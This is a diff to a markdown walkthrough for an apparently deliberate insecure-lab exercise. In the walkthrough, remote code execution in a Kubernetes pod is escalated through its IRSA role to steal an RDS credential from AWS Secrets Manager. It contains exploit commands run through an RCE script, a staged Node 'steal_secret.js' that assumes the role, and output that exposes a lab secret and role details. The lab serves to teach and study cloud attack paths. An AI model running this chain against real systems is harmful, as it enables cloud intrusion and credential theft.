@@ -27,12 +27,13 @@ cloud crown jewel — the **RDS secret in Secrets Manager**.
 ```txt
 React2Shell RCE in pod
   └─▶ pod's IRSA role  (broad policy)
-        └─▶ aws secretsmanager get-secret-value <rds-secret>
+        └─▶ STS AssumeRoleWithWebIdentity -> Secrets Manager GetSecretValue
               └─▶ 🪙 RDS secret
 ```
 
-The AWS SDK assumes the role transparently from the pod's projected token — no
-IMDS, no node access. One API call from inside the RCE shell.
+The pod's projected IRSA token is exchanged for role credentials, then used to
+read the secret — no IMDS, no node access. The image has no `aws` CLI, so the
+calls are plain signed HTTPS from Node built-ins.
 
 ---
 
@@ -40,15 +41,14 @@ IMDS, no node access. One API call from inside the RCE shell.
 
 High level. Detailed commands/output in the next step.
 
-| #   | Step              | What                                               | Expected result                   |
-| --- | ----------------- | -------------------------------------------------- | --------------------------------- |
-| 1   | Confirm RCE       | Run `id` via the React2Shell exploit               | Code exec on the pod              |
-| 2   | Detect IRSA       | Read `AWS_ROLE_ARN` / web-identity token env vars  | Pod has an AWS identity           |
-| 3   | Assume role       | `aws sts get-caller-identity` (SDK auto-uses IRSA) | Now an AWS principal              |
-| 4   | Enumerate reach   | `aws secretsmanager list-secrets`                  | Broad role → lists secrets        |
-| 5   | **Grab jewel**    | `aws secretsmanager get-secret-value <rds-secret>` | 🪙 RDS secret exfiltrated         |
-| 6   | Show blast radius | Inspect attached role policy (`*/*`)               | Confirms over-permission          |
-| 7   | Detection gap     | No CloudTrail / EKS audit logs                     | Breach is silent (phase 11 fixes) |
+| #   | Step              | What                                                | Expected result                   |
+| --- | ----------------- | --------------------------------------------------- | --------------------------------- |
+| 1   | Confirm RCE       | Run `id` via the React2Shell exploit                | Code exec on the pod              |
+| 2   | Detect IRSA       | Read `AWS_ROLE_ARN` / web-identity token env vars   | Pod has an AWS identity           |
+| 3   | No CLI            | `aws ...` → not found; stage a Node exploit instead | Attacker uses what's on the box   |
+| 4   | **Grab jewel**    | `steal_secret.js`: assume-role → GetSecretValue     | 🪙 RDS secret exfiltrated         |
+| 5   | Show blast radius | `steal_secret.js --list`: ListSecrets via `*/*`     | Lists secrets beyond its own      |
+| 6   | Detection gap     | No CloudTrail / EKS audit logs                      | Breach is silent (phase 11 fixes) |
 
 ---
 
@@ -103,12 +103,13 @@ python3 scripts/rce.py http://localhost:3000 "node /tmp/s.js react2shell-eks-dev
 # {"ARN":"arn:aws:secretsmanager:ca-central-1:099139718958:secret:react2shell-eks-dev-rds-credential-b5EgkD","CreatedDate":1.791514081673E9,"Name":"react2shell-eks-dev-rds-credential","SecretString":"{\"dbname\":\"appdb\",\"engine\":\"postgres\",\"host\":\"placeholder.rds.amazonaws.com\",\"password\":\"RDS-sECrEt-InsECurE\",\"port\":5432,\"username\":\"rds_admin\"}","VersionId":"terraform-bDQySnBEJwOZmMCUBC0fhbqOjv","VersionStages":["AWSCURRENT"]}
 
 
-# 5. blast radius — the */* role lists EVERY secret, not just its own
+# 5. blast radius — the */* role lists secrets, not just its own
+#    (re-stage /tmp/s.js first if steal_secret.js changed)
 python3 scripts/rce.py http://localhost:3000 "node /tmp/s.js --list"
 # executable response:
-# [*] role=arn:aws:iam::099139718958:role/react2shell-eks-dev-pod-irsa region=ca-central-1 secret=--list
-# [*] assumed role, akid=ASIAROFJQB4XDKSCYQ27
-# {"__type":"ResourceNotFoundException","Message":"Secrets Manager can't find the specified secret."}
+# [*] role=arn:aws:iam::099139718958:role/react2shell-eks-dev-pod-irsa region=ca-central-1 mode=list
+# [*] assumed role, akid=ASIAROFJQB4XIGNCE43C
+# {"SecretList":[{"ARN":"arn:aws:secretsmanager:ca-central-1:099139718958:secret:react2shell-eks-dev-rds-credential-b5EgkD","CreatedDate":1.791514081357E9,"Description":"RDS master credential (crown jewel for the lab).","LastAccessedDate":1.791504E9,"LastChangedDate":1.791514081676E9,"Name":"react2shell-eks-dev-rds-credential","SecretVersionsToStages":{"terraform-bDQySnBEJwOZmMCUBC0fhbqOjv":["AWSCURRENT"]},"Tags":[{"Key":"Project","Value":"react2shell-eks"},{"Key":"Environment","Value":"dev"},{"Key":"ManagedBy","Value":"terraform"}]}]}
 ```
 
 - **Why Node, not `aws`:** the insecure image ships Node (`next dev`) but no
